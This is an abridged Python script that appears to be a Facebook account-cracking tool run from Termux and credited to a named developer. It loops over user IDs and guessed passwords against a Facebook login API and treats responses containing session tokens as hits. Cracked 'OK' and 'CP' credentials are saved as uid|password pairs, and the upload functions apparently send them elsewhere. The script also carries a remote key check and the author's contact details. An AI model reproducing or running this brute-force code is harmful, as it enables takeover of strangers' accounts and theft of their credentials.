...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100046155324090"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/profile.php?id=100046155324090")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> TORIKUL ")
	subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100046155324090"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Mdtaeik417/abal1/blob/main/Tarik.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            TORIKUL ISLAM 
     \033[1;91m➣ \033[1;92mFACEBOOK   :            TORIKUL ISLAM 
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01331905839
     \033[1;96m➣ \033[1;92mGITHUB     :            mdtarik417
...
#				exit()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [TORIKUL] : \033[0;97m %s/%s -> \033[0;92m [ABIR -OK:%s ]- \033[0;93m[ABIR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
    ...
    'viewport-width': '980',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [TORIKUL-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[TORIKUL-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [TORIKUL-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
